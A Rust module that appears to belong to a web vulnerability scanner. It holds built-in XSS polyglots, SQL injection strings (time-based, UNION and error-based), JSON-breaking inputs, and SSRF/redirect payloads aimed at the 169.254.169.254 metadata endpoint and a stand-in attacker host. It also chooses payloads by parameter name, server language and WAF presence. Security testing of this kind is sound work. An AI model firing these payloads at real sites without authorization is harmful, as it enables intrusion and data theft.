use crate::core::mutator::InjectionPoint;
use crate::utils::fingerprint::TechProfile;
use std::fs;
use std::io::BufRead;
use std::path::Path;
use log::warn;

pub const POLYGLOT_XSS: &[&str] = &[
    r#"jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!\x3csVg/<sVg/oNloAd=alert()//>\x3e"#,
    r#"<svg/onload=alert()//>"#,
    r#"<img src=x onerror=alert()>"#,
    r#"</script><script>alert()</script>"#,
    r#"" onmouseover="alert()"#,
    r#"`${alert()}`"#,
    r#"\u003cscript\u003ealert()\u003c/script\u003e"#,
    r#"javascript:alert()//"#,
    r#"'-alert()-'"#,
    r#"<a id=x name=y href=1></a><a id=x name=z href=javascript:alert()></a>"#,
];

pub const POLYGLOT_SQLI: &[&str] = &[
    r#"' OR '1'='1'--"#,
    r#"' OR SLEEP(5)--"#,
    r#"'; SELECT pg_sleep(5)--"#,
    r#"' UNION SELECT NULL,NULL,NULL--"#,
    r#"'; WAITFOR DELAY '0:0:5'--"#,
    r#"' AND '1'='1"#,
    r#"%27%20OR%20%271%27%3D%271"#,
    r#"'/**/OR/**/1=1--"#,
    r#"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--"#,
    r#"1'/*!50000UNION*//*!50000SELECT*/1,2,3--"#,
];

pub const POLYGLOT_JSON: &[&str] = &[
    r#"""#,
    r#"","#,
    r#"}"#,
    r#"]"#,
    "\x00",
    r#"\"#,
    r#"\u0000"#,
    r#"":"#,
    r#"],"" "#,
    r#"},"key":"""#,
    r#"{"nested":"value"}"#,
    r#"true"#,
    r#"123"#,
    "\n\r",
];

#[derive(Debug, Clone, Default)]
pub struct PayloadLoader {
    pub xss_payloads: Vec<String>,
    pub sqli_payloads: Vec<String>,
    pub json_payloads: Vec<String>,
    pub generic_payloads: Vec<String>,
    pub path_traversal_payloads: Vec<String>,
}

impl PayloadLoader {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn load() -> Self {
        let mut loader = Self::new();

        loader.xss_payloads = load_list_from_file("payloads/seclist_xss.txt");
        if loader.xss_payloads.is_empty() {
            warn!("No XSS payloads loaded from payloads/seclist_xss.txt");
        }

        loader.sqli_payloads = load_list_from_file("payloads/Generic-SQLi.txt");
        if loader.sqli_payloads.is_empty() {
            warn!("No SQLi payloads loaded from payloads/Generic-SQLi.txt");
        }

        loader.path_traversal_payloads = load_list_from_file("payloads/path_traversal.txt");
        if loader.path_traversal_payloads.is_empty() {
            warn!("No path-traversal payloads loaded from payloads/path_traversal.txt");
        }

        loader
    }

    pub fn load_with_extra(extra_path: Option<&str>) -> Self {
        let mut loader = Self::load();
        if let Some(path) = extra_path {
            let extra = load_list_from_file(path);
            if extra.is_empty() {
                warn!("No payloads loaded from custom path: {}", path);
            } else {
                loader.xss_payloads.extend(extra.iter().cloned());
                loader.sqli_payloads.extend(extra.iter().cloned());
                loader.generic_payloads.extend(extra);
            }
        }
        loader
    }

    pub fn load_from_paths(
        xss_path: Option<&str>,
        sqli_path: Option<&str>,
        json_path: Option<&str>,
        generic_path: Option<&str>,
    ) -> Self {
        let mut loader = Self::new();
        if let Some(path) = xss_path {
            loader.xss_payloads = load_list_from_file(path);
            if loader.xss_payloads.is_empty() { warn!("No XSS payloads loaded from {}", path); }
        }
        if let Some(path) = sqli_path {
            loader.sqli_payloads = load_list_from_file(path);
            if loader.sqli_payloads.is_empty() { warn!("No SQLi payloads loaded from {}", path); }
        }
        if let Some(path) = json_path {
            loader.json_payloads = load_list_from_file(path);
            if loader.json_payloads.is_empty() { warn!("No JSON payloads loaded from {}", path); }
        }
        if let Some(path) = generic_path {
            loader.generic_payloads = load_list_from_file(path);
            if loader.generic_payloads.is_empty() { warn!("No generic payloads loaded from {}", path); }
        }
        loader
    }

    // ── Named accessors (clone-free view via reference, returns owned for ergonomics) ──

    pub fn xss_payloads(&self) -> Vec<String> {
        let mut out: Vec<String> = POLYGLOT_XSS.iter().map(|s| s.to_string()).collect();
        out.extend(self.xss_payloads.iter().cloned());
        out
    }

    pub fn sqli_payloads(&self) -> Vec<String> {
        let mut out: Vec<String> = POLYGLOT_SQLI.iter().map(|s| s.to_string()).collect();
        out.extend(self.sqli_payloads.iter().cloned());
        out
    }

    pub fn path_traversal_payloads(&self) -> Vec<String> {
        self.path_traversal_payloads.clone()
    }

    pub fn all_payloads(&self) -> Vec<String> {
        let mut out = self.xss_payloads();
        out.extend(self.sqli_payloads());
        out.extend(self.json_payloads.iter().cloned());
        out.extend(self.generic_payloads.iter().cloned());
        out.extend(self.path_traversal_payloads.iter().cloned());
        out
    }

    /// Returns context-aware payloads based on the parameter name.
    pub fn contextual_payloads(&self, param_name: &str) -> Vec<String> {
        let name = param_name.to_lowercase();

        if ["id", "user_id", "item", "product_id", "order", "uid"]
            .iter()
            .any(|n| name.contains(n))
        {
            return self.sqli_payloads();
        }

        if ["redirect", "url", "next", "return", "goto", "dest", "destination"]
            .iter()
            .any(|n| name.contains(n))
        {
            return vec![
                "http://169.254.169.254/latest/meta-data/".into(),
                "//evil.arkenar.test".into(),
                "https://example.com".into(),
            ];
        }

        if ["file", "path", "include", "template", "page", "doc"]
            .iter()
            .any(|n| name.contains(n))
        {
            return self.path_traversal_payloads();
        }

        if ["q", "search", "query", "term", "keyword", "comment", "message", "name"]
            .iter()
            .any(|n| name.contains(n))
        {
            return self.xss_payloads();
        }

        self.all_payloads()
    }

    pub fn get_payloads_for_point(&self, point: &InjectionPoint) -> Vec<String> {
        let mut payloads = Vec::new();
        match point {
            InjectionPoint::JsonField(_) => {
                payloads.extend(POLYGLOT_JSON.iter().map(|s| s.to_string()));
                payloads.extend(self.json_payloads.iter().cloned());
                payloads.extend(self.generic_payloads.iter().cloned());
            }
            InjectionPoint::UrlParam(_) | InjectionPoint::FormParam(_) => {
                payloads.extend(POLYGLOT_XSS.iter().map(|s| s.to_string()));
                payloads.extend(POLYGLOT_SQLI.iter().map(|s| s.to_string()));
                payloads.extend(self.xss_payloads.iter().cloned());
                payloads.extend(self.sqli_payloads.iter().cloned());
            }
            InjectionPoint::Header(_) => {
                payloads.extend(self.generic_payloads.iter().cloned());
                payloads.extend(POLYGLOT_SQLI.iter().map(|s| s.to_string()));
                payloads.extend(self.sqli_payloads.iter().cloned());
            }
        }
        payloads
    }

    pub fn get_payloads_for_point_tech_aware(
        &self,
        point: &InjectionPoint,
        profile: &TechProfile,
    ) -> Vec<String> {
        let lang = profile.language.as_deref().unwrap_or("").to_lowercase();
        let is_aspnet = lang.contains("asp.net");
        let is_php    = lang.contains("php");
        let is_java   = lang.contains("java");
        let has_waf   = profile.waf.is_some();

        if !is_aspnet && !is_php && !is_java && !has_waf {
            return self.get_payloads_for_point(point);
        }

        let mut payloads: Vec<String> = Vec::new();

        match point {
            InjectionPoint::JsonField(_) => {
                payloads.extend(POLYGLOT_JSON.iter().map(|s| s.to_string()));
                payloads.extend(self.json_payloads.iter().cloned());
                payloads.extend(self.generic_payloads.iter().cloned());
            }
            InjectionPoint::UrlParam(_) | InjectionPoint::FormParam(_) => {
                payloads.extend(POLYGLOT_XSS.iter().map(|s| s.to_string()));

                let sqli_hi: Vec<String>;
                let sqli_lo: Vec<String>;
                if is_aspnet {
                    sqli_hi = POLYGLOT_SQLI.iter()
                        .filter(|p| p.contains("WAITFOR") || p.contains("UNION SELECT"))
                        .map(|s| s.to_string()).collect();
                    sqli_lo = POLYGLOT_SQLI.iter()
                        .filter(|p| !p.contains("WAITFOR") && !p.contains("UNION SELECT"))
                        .map(|s| s.to_string()).collect();
                } else if is_php {
                    sqli_hi = POLYGLOT_SQLI.iter()
                        .filter(|p| p.contains("SLEEP") || p.contains("EXTRACTVALUE"))
                        .map(|s| s.to_string()).collect();
                    sqli_lo = POLYGLOT_SQLI.iter()
                        .filter(|p| !p.contains("SLEEP") && !p.contains("EXTRACTVALUE"))
                        .map(|s| s.to_string()).collect();
                } else if is_java {
                    sqli_hi = POLYGLOT_SQLI.iter()
                        .filter(|p| p.contains("pg_sleep"))
                        .map(|s| s.to_string()).collect();
                    sqli_lo = POLYGLOT_SQLI.iter()
                        .filter(|p| !p.contains("pg_sleep"))
                        .map(|s| s.to_string()).collect();
                } else {
                    sqli_hi = POLYGLOT_SQLI.iter().map(|s| s.to_string()).collect();
                    sqli_lo = Vec::new();
                }
                payloads.extend(sqli_hi);
                payloads.extend(sqli_lo);
                payloads.extend(self.xss_payloads.iter().cloned());
                payloads.extend(self.sqli_payloads.iter().cloned());
            }
            InjectionPoint::Header(_) => {
                payloads.extend(self.generic_payloads.iter().cloned());
                if is_aspnet {
                    let mssql: Vec<String> = POLYGLOT_SQLI.iter()
                        .filter(|p| p.contains("WAITFOR"))
                        .map(|s| s.to_string())
                        .collect();
                    payloads.extend(mssql);
                }
                payloads.extend(POLYGLOT_SQLI.iter().map(|s| s.to_string()));
                payloads.extend(self.sqli_payloads.iter().cloned());
            }
        }

        if has_waf {
            payloads.retain(|p| !p.contains("<script>") && !p.contains("alert()"));
        }

        let mut seen = std::collections::HashSet::new();
        payloads.retain(|p| seen.insert(p.clone()));

        payloads
    }

    pub fn get_all_polyglots(&self) -> Vec<String> {
        let mut payloads = Vec::new();
        payloads.extend(POLYGLOT_XSS.iter().map(|s| s.to_string()));
        payloads.extend(POLYGLOT_SQLI.iter().map(|s| s.to_string()));
        payloads.extend(POLYGLOT_JSON.iter().map(|s| s.to_string()));
        payloads
    }

    pub fn payload_count(&self) -> usize {
        self.xss_payloads.len()
            + self.sqli_payloads.len()
            + self.json_payloads.len()
            + self.generic_payloads.len()
            + self.path_traversal_payloads.len()
    }

    pub fn total_payload_count(&self) -> usize {
        self.payload_count() + POLYGLOT_XSS.len() + POLYGLOT_SQLI.len() + POLYGLOT_JSON.len()
    }
}

pub fn load_list_from_file(path: &str) -> Vec<String> {
    let path = Path::new(path);
    let file = match fs::File::open(path) {
        Ok(f) => f,
        Err(e) => {
            warn!("Failed to open payload file {:?}: {}", path, e);
            return Vec::new();
        }
    };
    let reader = std::io::BufReader::new(file);
    reader
        .lines()
        .filter_map(|line| line.ok())
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty() && !s.starts_with('#'))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_polyglot_counts() {
        assert_eq!(POLYGLOT_XSS.len(), 10);
        assert_eq!(POLYGLOT_SQLI.len(), 10);
        assert!(POLYGLOT_JSON.len() >= 10);
    }

    #[test]
    fn test_get_payloads_for_json_field() {
        let loader = PayloadLoader::new();
        let payloads = loader.get_payloads_for_point(&InjectionPoint::JsonField("user.name".to_string()));
        assert!(!payloads.is_empty());
        assert_eq!(payloads[0], POLYGLOT_JSON[0]);
    }

    #[test]
    fn test_get_payloads_for_url_param() {
        let loader = PayloadLoader::new();
        let payloads = loader.get_payloads_for_point(&InjectionPoint::UrlParam("id".to_string()));
        assert!(!payloads.is_empty());
        assert_eq!(payloads[0], POLYGLOT_XSS[0]);
    }

    #[test]
    fn test_get_payloads_for_form_param() {
        let loader = PayloadLoader::new();
        let payloads = loader.get_payloads_for_point(&InjectionPoint::FormParam("username".to_string()));
        assert!(!payloads.is_empty());
        assert_eq!(payloads[0], POLYGLOT_XSS[0]);
    }

    #[test]
    fn test_get_payloads_for_header() {
        let loader = PayloadLoader::new();
        let payloads = loader.get_payloads_for_point(&InjectionPoint::Header("User-Agent".to_string()));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("OR")));
    }

    #[test]
    fn test_all_polyglots() {
        let loader = PayloadLoader::new();
        let all = loader.get_all_polyglots();
        let expected = POLYGLOT_XSS.len() + POLYGLOT_SQLI.len() + POLYGLOT_JSON.len();
        assert_eq!(all.len(), expected);
    }

    #[test]
    fn test_payload_count_empty() {
        let loader = PayloadLoader::new();
        assert_eq!(loader.payload_count(), 0);
        assert_eq!(
            loader.total_payload_count(),
            POLYGLOT_XSS.len() + POLYGLOT_SQLI.len() + POLYGLOT_JSON.len()
        );
    }

    #[test]
    fn test_payload_count_with_payloads() {
        let mut loader = PayloadLoader::new();
        loader.xss_payloads = vec!["<script>".to_string(), "<img>".to_string()];
        loader.sqli_payloads = vec!["' OR 1=1".to_string()];
        assert_eq!(loader.payload_count(), 3);
    }

    #[test]
    fn test_contextual_payloads_redirect() {
        let loader = PayloadLoader::new();
        let payloads = loader.contextual_payloads("redirect_url");
        assert!(payloads.iter().any(|p| p.contains("169.254")));
    }

    #[test]
    fn test_contextual_payloads_id() {
        let loader = PayloadLoader::new();
        let payloads = loader.contextual_payloads("user_id");
        assert!(payloads.iter().any(|p| p.contains("OR")));
    }
}
